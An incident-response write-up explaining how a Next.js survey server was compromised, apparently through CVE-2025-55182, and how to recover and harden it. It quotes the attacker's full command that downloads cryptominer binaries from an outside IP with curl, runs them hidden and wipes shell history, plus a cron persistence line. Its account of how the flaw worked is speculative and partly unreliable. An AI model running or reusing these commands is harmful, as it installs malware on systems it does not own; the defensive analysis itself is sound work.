# Attack Vector Analysis: How the Breach Occurred

## 🎯 Attack Summary

Your server was compromised through **CVE-2025-55182 (React2Shell)**, a critical Remote Code Execution (RCE) vulnerability in Next.js 15.4.2. The attacker exploited a flaw in Next.js server actions/API routes that allowed them to execute arbitrary shell commands.

---

## 📋 Attack Timeline

Based on your error logs, here's what happened:

### Phase 1: Initial Exploitation (December 8-9, 2025)
1. **Attacker discovers vulnerable Next.js application**
   - Scanned for Next.js 15.4.2 instances
   - Identified your application at `https://survey.research-connectllc.com`

2. **Header injection attempts**
   - Error log shows: `TypeError: Invalid character in header content ["x-action-redirect"]`
   - Attacker tried to inject malicious redirect headers
   - Next.js partially blocked these attempts (hence the errors)

3. **Command injection through server actions**
   - Attacker found a vulnerable server action or API route
   - Exploited CVE-2025-55182 to inject shell commands
   - Commands were executed on the server

### Phase 2: Malware Deployment (December 9, 2025 - 22:22:24)
The attacker successfully executed this malicious command:

```bash
rm -rf /etc/de && 
pkill cARM ; pkill cX86 ; 
mkdir /etc/de && 
curl -k -o /etc/de/cARM http://5.231.31.52/cARM && 
curl -k -o /etc/de/cX86 http://5.231.31.52/cX86 && 
chmod 777 /etc/de/c* ; 
nohup /etc/de/./cARM > /dev/null 2>&1 & 
nohup /etc/de/./cX86 > /dev/null l 2>&1 & 
disown && history -c
```

**What this did:**
1. Removed any existing `/etc/de` directory
2. Killed any existing cryptominer processes
3. Created new `/etc/de` directory
4. Downloaded cryptominer binaries (`cARM` for ARM, `cX86` for x86) from malicious IP `5.231.31.52`
5. Made them executable (`chmod 777`)
6. Started them in background (`nohup`)
7. Cleared command history to hide tracks

### Phase 3: Persistence Setup
The attacker set up multiple persistence mechanisms:

1. **Cron jobs** (runs every minute):
   ```bash
   * * * * * /tmp/.esd101/./.b4nd1d0 > /dev/null 2>&1 & disown
   ```

2. **Systemd service**: `5168631990d6.service`

3. **Binary placement in app directory**:
   - `/var/www/survey-portal/apps/web/i386` (32-bit binaries)
   - `/var/www/survey-portal/apps/web/amd64` (64-bit binaries)

---

## 🔍 How CVE-2025-55182 (React2Shell) Works

### The Vulnerability

**CVE-2025-55182** is a critical vulnerability in Next.js that allows Remote Code Execution through:

1. **Server Actions**: Next.js server actions can be vulnerable if they:
   - Accept user input without proper validation
   - Use user input in redirects or URL construction
   - Process headers or query parameters unsafely

2. **Header Injection**: The error logs show attempts to inject `x-action-redirect` headers, which suggests the attacker tried to:
   - Manipulate redirect URLs
   - Inject malicious commands through header values
   - Exploit Next.js's server action redirect mechanism

### Attack Vector in Your Application

Based on the error patterns, the attacker likely:

1. **Found a vulnerable endpoint** that:
   - Accepts user input (form data, query params, headers)
   - Uses that input in server-side operations
   - Doesn't properly sanitize/validate input

2. **Injected malicious payload** through:
   - Form submissions
   - URL parameters
   - HTTP headers (like `x-action-redirect`)
   - Request body data

3. **Exploited Next.js server action** that:
   - Processed the malicious input
   - Executed it as a shell command (likely through `child_process.exec()` or similar)
   - Or used it in an unsafe redirect/URL construction

### Why It Worked

Your application was vulnerable because:

1. **Outdated Next.js version**: Next.js 15.4.2 contains the CVE-2025-55182 vulnerability
2. **No input validation**: Server actions/API routes likely didn't validate user input
3. **Unsafe command execution**: Some code path allowed user input to reach shell commands
4. **No security headers**: Missing Content Security Policy and other security headers

---

## 🛡️ How to Prevent This in the Future

### 1. **Immediate Actions**

```bash
# Update Next.js immediately
cd apps/web
npm update next@latest
npm audit fix --force
```

### 2. **Code Security Hardening**

#### A. Validate All User Input
```typescript
// ❌ BAD - No validation
export async function serverAction(formData: FormData) {
  const url = formData.get('redirectUrl');
  redirect(url); // DANGEROUS!
}

// ✅ GOOD - Validate input
export async function serverAction(formData: FormData) {
  const url = formData.get('redirectUrl');
  
  // Validate URL format
  if (!url || typeof url !== 'string') {
    throw new Error('Invalid URL');
  }
  
  // Validate URL is safe (same origin or whitelist)
  const parsedUrl = new URL(url);
  const allowedOrigins = ['https://survey.research-connectllc.com'];
  if (!allowedOrigins.includes(parsedUrl.origin)) {
    throw new Error('URL not allowed');
  }
  
  redirect(url);
}
```

#### B. Never Execute Shell Commands with User Input
```typescript
// ❌ BAD - Command injection vulnerability
import { exec } from 'child_process';
const userInput = formData.get('command');
exec(userInput); // DANGEROUS!

// ✅ GOOD - Use safe alternatives
// Use Node.js APIs instead of shell commands
// If you MUST use shell commands, use execFile with a whitelist
```

#### C. Sanitize Headers
```typescript
// ❌ BAD - Direct header usage
const redirectUrl = request.headers.get('x-action-redirect');
redirect(redirectUrl);

// ✅ GOOD - Validate and sanitize
const redirectUrl = request.headers.get('x-action-redirect');
if (redirectUrl) {
  // Validate it's a safe URL
  try {
    const url = new URL(redirectUrl);
    // Check against whitelist
    if (isAllowedUrl(url)) {
      redirect(redirectUrl);
    }
  } catch {
    throw new Error('Invalid redirect URL');
  }
}
```

### 3. **Security Headers**

Add to `next.config.js`:
```javascript
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          }
        ]
      }
    ];
  }
};
```

### 4. **Rate Limiting**

Implement rate limiting on all API routes and server actions to prevent brute force attacks.

### 5. **Input Validation Library**

Use a validation library like `zod`:
```typescript
import { z } from 'zod';

const redirectSchema = z.object({
  url: z.string().url().refine(
    (url) => url.startsWith('https://survey.research-connectllc.com'),
    'URL must be from allowed domain'
  )
});

export async function serverAction(formData: FormData) {
  const result = redirectSchema.safeParse({
    url: formData.get('url')
  });
  
  if (!result.success) {
    throw new Error('Invalid input');
  }
  
  redirect(result.data.url);
}
```

### 6. **Security Monitoring**

- Set up intrusion detection (fail2ban)
- Monitor for suspicious processes
- Alert on unusual network activity
- Log all server actions and API calls

---

## 🔎 Finding the Vulnerable Code

To identify where the vulnerability was exploited, check:

1. **Server Actions** (`apps/web/app/**/actions.ts`):
   - Look for `redirect()` calls with user input
   - Check for any `exec()` or `spawn()` calls
   - Review form data processing

2. **API Routes** (`apps/web/app/api/**/route.ts`):
   - Check header processing
   - Review query parameter handling
   - Look for URL construction with user input

3. **Middleware**:
   - Check for header manipulation
   - Review redirect logic

4. **Search for dangerous patterns**:
   ```bash
   # Find potential vulnerabilities
   grep -r "redirect(" apps/web/app/
   grep -r "exec(" apps/web/
   grep -r "spawn(" apps/web/
   grep -r "x-action-redirect" apps/web/
   ```

---

## 📊 Attack Impact

### What the Attacker Did:
1. ✅ Executed arbitrary shell commands
2. ✅ Downloaded and ran cryptominers
3. ✅ Set up persistence mechanisms
4. ✅ Hid their tracks (cleared history)

### What They Could Have Done:
- Stolen database credentials
- Accessed user data
- Modified application code
- Set up backdoors
- Exfiltrated sensitive information

### What You Should Check:
1. **Database access logs** - Did they access your database?
2. **User data** - Was any PII accessed?
3. **Code integrity** - Was any code modified?
4. **Backups** - Are your backups compromised?
5. **Other servers** - Are other servers in your infrastructure affected?

---

## ✅ Recovery Checklist

- [x] Stopped all services
- [x] Removed malware binaries (i386, amd64)
- [x] Killed malicious processes
- [ ] Removed all malware directories
- [ ] Cleaned cron jobs
- [ ] Updated Next.js to latest version
- [ ] Reviewed and hardened server actions/API routes
- [ ] Added security headers
- [ ] Implemented input validation
- [ ] Rotated all secrets (JWT, database passwords)
- [ ] Set up monitoring
- [ ] Verified no backdoors remain
- [ ] Tested application security
- [ ] Restarted services (only after all above are complete)

---

## 🚨 Key Takeaways

1. **Always keep dependencies updated** - Next.js 15.4.2 had a known vulnerability
2. **Validate all user input** - Never trust user input
3. **Use security headers** - CSP and other headers prevent many attacks
4. **Monitor your systems** - Early detection is crucial
5. **Have an incident response plan** - Know what to do when breached

---

**Remember**: This attack happened because of a vulnerability in Next.js, not necessarily because of your code. However, proper input validation and security headers would have made exploitation much harder or impossible.

